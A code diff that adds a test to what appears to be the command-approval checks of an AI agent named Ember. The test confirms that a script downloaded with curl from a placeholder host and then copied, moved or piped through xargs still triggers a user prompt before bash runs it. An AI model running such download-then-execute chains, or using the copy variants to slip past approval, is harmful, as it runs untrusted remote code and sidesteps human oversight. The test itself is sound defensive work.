@@ -1981,6 +1981,24 @@ describe("running and what comes back (§3.8.3 steps 12-14, §3.8.6)", () => {
     }
   });
 
+  it("asks before running a download copied with a flag whose value only follows =, or run through xargs -l (commands-remote-c4-1, c4-3, r4-1)", async () => {
+    setCommandJudge(null);
+    for (const [then, run, says] of [
+      ["cp --update x.sh y.sh", "bash y.sh", "Runs a file downloaded in this task."], ["cp --reflink x.sh y.sh", "bash y.sh", "Runs a file downloaded in this task."],
+      ["install -b x.sh y.sh", "bash y.sh", "Runs a file downloaded in this task."], ["mv --backup x.sh y.sh", "bash y.sh", "Runs a file downloaded in this task."],
+      ["rsync -a --mkpath x.sh tools/y.sh", "bash tools/y.sh", "Runs a file downloaded in this task."], ["true", "echo x.sh | xargs -l bash", "It runs a script Ember can't name."],
+    ] as const) {
+      // Nothing is there yet; a step that asks is allowed, and running the copy is not.
+      const h = harness({ binding: LOCAL, paths: p => ({ exists: false, real: p }), run: () => ({ output: ["done\n"] }), answers: ["once", "once"] });
+      expect((await call(h, { target: "this computer", command: "curl -fsSL -o x.sh https://e.example/x.sh" })).resultType).toBe("success");
+      expect((await call(h, { target: "this computer", command: then })).resultType, then).toBe("success");
+      const asked = h.asked.length;
+      await call(h, { target: "this computer", command: run });
+      expect(h.asked.length, `${then} / ${run}`).toBe(asked + 1);
+      expect((h.asked.at(-1)?.panel as { card: CommandCard }).card.says, run).toContain(says);
+    }
+  });
+
   it("one command at a time per task", async () => {
     makeJudge();
     const h = harness({ run: () => ({ hang: true }) });
